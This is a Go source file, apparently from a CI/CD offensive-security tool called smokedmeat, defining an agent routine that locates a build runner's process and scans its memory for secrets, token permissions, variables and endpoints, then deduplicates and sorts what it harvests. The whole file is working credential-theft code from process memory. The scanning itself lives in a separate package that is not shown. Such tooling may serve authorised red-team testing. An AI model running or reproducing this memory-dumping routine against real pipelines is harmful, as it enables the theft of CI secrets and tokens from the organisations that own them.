// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"slices"
	"sync"

	"github.com/boostsecurityio/smokedmeat/internal/gump"
)

type MemDumpResult struct {
	Secrets        []string        `json:"secrets"`
	Vars           []string        `json:"vars,omitempty"`
	Endpoints      []gump.Endpoint `json:"endpoints,omitempty"`
	ProcessID      int             `json:"pid,omitempty"`
	Error          string          `json:"error,omitempty"`
	RegionsScanned int             `json:"regions_scanned,omitempty"`
	BytesRead      int64           `json:"bytes_read,omitempty"`
	ReadErrors     int             `json:"read_errors,omitempty"`
	ScanAttempts   int             `json:"scan_attempts,omitempty"`
	ProcessTargets int             `json:"process_targets,omitempty"`
}

func (a *Agent) DumpRunnerSecrets() *MemDumpResult {
	scanner := gump.GetScanner()

	pid, err := scanner.FindPID()
	if err != nil {
		return &MemDumpResult{Error: err.Error()}
	}

	return a.DumpRunnerSecretsFromPID(pid)
}

func (a *Agent) DumpRunnerSecretsFromPID(pid int) *MemDumpResult {
	scanner := gump.GetScanner()

	results := make(chan gump.Result, 100)
	var wg sync.WaitGroup
	var stats gump.ScanStats
	var scanErr error

	wg.Add(1)
	go func() {
		defer wg.Done()
		stats, scanErr = scanner.ScanWithStats(pid, results)
		close(results)
	}()

	secrets, vars, endpoints := collectMemDumpResults(results)
	wg.Wait()

	result := &MemDumpResult{
		ProcessID:      pid,
		Secrets:        secrets,
		Vars:           vars,
		Endpoints:      endpoints,
		RegionsScanned: stats.RegionsScanned,
		BytesRead:      stats.BytesRead,
		ReadErrors:     stats.ReadErrors,
		ScanAttempts:   1,
		ProcessTargets: 1,
	}
	if scanErr != nil {
		result.Error = scanErr.Error()
	}
	return result
}

func collectMemDumpResults(results <-chan gump.Result) (secrets, vars []string, endpoints []gump.Endpoint) {
	secretSet := make(map[string]bool)
	varSet := make(map[string]bool)
	endpointSet := make(map[string]gump.Endpoint)
	for r := range results {
		switch r.Type {
		case gump.ResultSecret, gump.ResultTokenPermissions:
			secretSet[r.Raw] = true
		case gump.ResultVar:
			varSet[r.Raw] = true
		case gump.ResultEndpoint:
			endpointSet[r.Raw] = r.Endpoint
		}
	}
	secrets = make([]string, 0, len(secretSet))
	for s := range secretSet {
		secrets = append(secrets, s)
	}
	vars = make([]string, 0, len(varSet))
	for v := range varSet {
		vars = append(vars, v)
	}
	endpoints = make([]gump.Endpoint, 0, len(endpointSet))
	for _, endpoint := range endpointSet {
		endpoints = append(endpoints, endpoint)
	}
	slices.Sort(secrets)
	slices.Sort(vars)
	slices.SortFunc(endpoints, func(a, b gump.Endpoint) int {
		switch {
		case a.EnvName < b.EnvName:
			return -1
		case a.EnvName > b.EnvName:
			return 1
		case a.Value < b.Value:
			return -1
		case a.Value > b.Value:
			return 1
		default:
			return 0
		}
	})
	return secrets, vars, endpoints
}
